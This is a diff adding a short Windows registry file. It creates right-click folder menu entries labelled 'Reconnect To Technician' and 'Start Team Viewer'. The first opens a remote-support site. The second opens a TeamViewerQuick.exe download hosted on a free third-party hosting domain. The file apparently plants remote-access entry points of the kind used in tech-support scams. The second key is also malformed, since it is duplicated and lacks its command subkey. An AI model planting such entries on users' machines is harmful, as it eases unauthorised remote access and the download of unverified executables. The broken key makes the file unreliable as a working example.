@@ -1,0 +1,11 @@
+Windows Registry Editor Version 5.00
+
+[HKEY_CLASSES_ROOT\Directory\shell\Reconnect To Technician]
+
+[HKEY_CLASSES_ROOT\Directory\shell\Reconnect To Technician\command]
+@="cmd.exe /c start iexplore.exe logmein123.com"
+
+[HKEY_CLASSES_ROOT\Directory\shell\Start Team Viewer]
+
+[HKEY_CLASSES_ROOT\Directory\shell\Start Team Viewer]
+@="cmd.exe /c start iexplore.exe toolhost.x10.mx/TeamViewerQuick.exe"
